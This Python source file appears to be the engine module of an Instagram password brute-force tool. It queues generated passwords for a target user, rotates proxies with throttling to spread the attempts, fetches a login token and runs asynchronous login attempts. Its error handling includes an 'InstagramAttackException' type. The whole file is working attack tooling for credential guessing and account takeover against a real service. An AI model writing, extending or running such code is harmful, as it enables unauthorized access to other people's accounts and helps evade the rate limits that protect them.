from __future__ import absolute_import

import logging
import logging.config

import asyncio
import time

from app.lib import exceptions
from app.lib.utils import auto_logger

from .login import login_handler
from .tokens import token_handler
from .managers import TaskManager, QueueManager


__all__ = ('Engine', )


log = logging.getLogger(__file__).setLevel(logging.INFO)


class Engine(object):

    def __init__(self, config, global_stop_event, proxies):

        self.config = config
        self.global_stop_event = global_stop_event
        self.queues = QueueManager(proxies={'generated': proxies})

        self.login_handler = login_handler(config, global_stop_event, self.queues)
        self.token_handler = token_handler(config, global_stop_event, self.queues)

    # Old potentially useful function we want to keep around from old
    # AsyncTaskManager.
    async def _handle_exception(self, exc_type, exc_value, tb):
        import traceback
        # We want to do request exception handling outsie of the context.
        # Not sure why this check is necessary?
        if issubclass(exc_type, exceptions.FatalException):
            self.log.critical(exc_value, extra=self.log_context(tb))
            return await self._shutdown()

        elif issubclass(exc_type, exceptions.InstagramAttackException):
            self.log.error(exc_value, extra=self.log_context(tb))
            return True
        else:
            self.log.error(exc_value, extra=self.log_context(tb))
            self.log.info(traceback.format_exc())
            return True

    @auto_logger("Populating Passwords")
    async def populate_passwords(self, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        for password in self.config.user.get_new_attempts():
            self.queues.passwords.generated.put_nowait(password)

        if self.queues.passwords.generated.empty():
            raise exceptions.FatalException("No new passwords to try.")

        log.info(f"Populated {self.queues.passwords.generated.qsize()} Passwords")

    @auto_logger('Proxy Handler')
    async def pass_on_proxies(self, log):
        """
        We are going to use this to better control the flow of proxies into the
        system.

        We don't need them to be funneling through at super fast speeds, and we
        also may want to validate them in some way before providing them to the
        consumers.
        """
        while not self.global_stop_event.is_set():
            proxy = await self.queues.proxies.generated.get()
            if proxy:
                if self.config.proxysleep:
                    time.sleep(self.config.proxysleep)
                log.debug('Got Proxy', extra={'proxy': proxy})
                self.queues.proxies.handled.put_nowait(proxy)
            else:
                log.debug('No New Proxies')

    @auto_logger("Attack")
    async def attack(self, loop, log):

        token = await self.token_handler.fetch()
        if token is None:
            raise exceptions.FatalException(
                "The allowable attempts to retrieve a token did not result in a "
                "valid response containing a token.  This is most likely do to "
                "a connection error."
            )

        # Check if --test was provided, and if so only use one password that is
        # attached to user object.
        log.success("Set Token", extra={'token': token})

        # async with AysncExceptionHandler():
        results = await self.login_handler.login(token)
        if not results:
            log.error('Could not authenticate.')
        self.global_stop_event.set()

    @auto_logger('Running')
    async def run(self, loop, log):

        await self.populate_passwords()

        manager = TaskManager(self.global_stop_event, log=log)
        manager.add(
            asyncio.ensure_future(self.pass_on_proxies()),
            asyncio.ensure_future(self.attack(loop)),
        )

        while manager.active:
            await asyncio.gather(*manager.tasks, loop=loop)
            manager.stop()
        log.critical('Global Stop Event Stopped')
